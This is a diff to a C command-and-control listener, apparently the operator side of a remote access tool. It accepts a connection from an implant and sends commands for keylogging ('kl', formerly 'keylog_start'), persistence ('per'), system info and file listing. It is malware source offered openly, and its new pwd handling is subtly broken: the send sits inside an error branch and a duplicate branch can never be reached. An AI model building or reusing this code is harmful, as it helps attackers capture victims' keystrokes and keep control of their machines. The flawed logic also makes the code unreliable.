@@ -7,6 +7,8 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
+#define MAX_RESPONSE_SIZE 4096
+
 
 int main() {
 
@@ -29,10 +31,11 @@ int main() {
     server_address.sin_addr.s_addr = inet_addr("192.168.1.47");  // our own node IP addr
     server_address.sin_port = htons(50001);
 
-    bind(sock, (struct sockaddr ) &server_address, sizeof(server_address));
+    bind(sock, (struct sockaddr*)&server_address, sizeof(server_address));
     listen(sock, 5);
     client_lenght = sizeof(client_address);
-    client_socket = accept(sock, (struct sockaddr) &client_address, &client_lenght);
+    client_socket = accept(sock, (struct sockaddr*)&client_address, &client_lenght);
+
 
     while(1)
     {
@@ -49,10 +52,41 @@ int main() {
         else if (strncmp("cd ", buffer, 3) == 0) {
             goto jump;
         }
-        else if (strncmp("keylog_start", buffer, 12) == 0 ) {
+        else if (strcmp(buffer, "exit") == 0) {
+            printf("Cliente desconectado desde %s:%d\n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));
+            break;
+        }
+        else if (strcmp(buffer, "pwd") == 0) {
+            // Obtener el directorio actual del servidor
+            char currentDir[MAX_RESPONSE_SIZE];
+            if (getcwd(currentDir, sizeof(currentDir)) == NULL) {
+                printf("Error al obtener el directorio actual del servidor\n");
+                break;
+
+            // Enviar la respuesta al cliente
+            if (send(client_socket, currentDir, strlen(currentDir), 0) != strlen(currentDir)) {
+                printf("Error al enviar la respuesta al cliente\n");
+                break;
+                }
+            }
+        }
+
+        else if (strncmp("kl", buffer, 2) == 0 ) {
             goto jump;
         }
-        else if (strncmp("persist", buffer, 7) == 0 ) {
+        else if (strncmp("per", buffer, 3) == 0 ) {
+            recv(client_socket,response,sizeof(response),0);
+            printf("%s", response);
+        }
+        else if (strncmp("sys", buffer, 3) == 0 ) {
+            recv(client_socket,response,sizeof(response),0);
+            printf("%s", response);
+        }
+        else if (strncmp("pwd", buffer, 3) == 0 ) {
+            recv(client_socket,response,sizeof(response),0);
+            printf("%s", response);
+        }
+        else if (strncmp("ls", buffer, 2) == 0 ) {
             recv(client_socket,response,sizeof(response),0);
             printf("%s", response);
         }
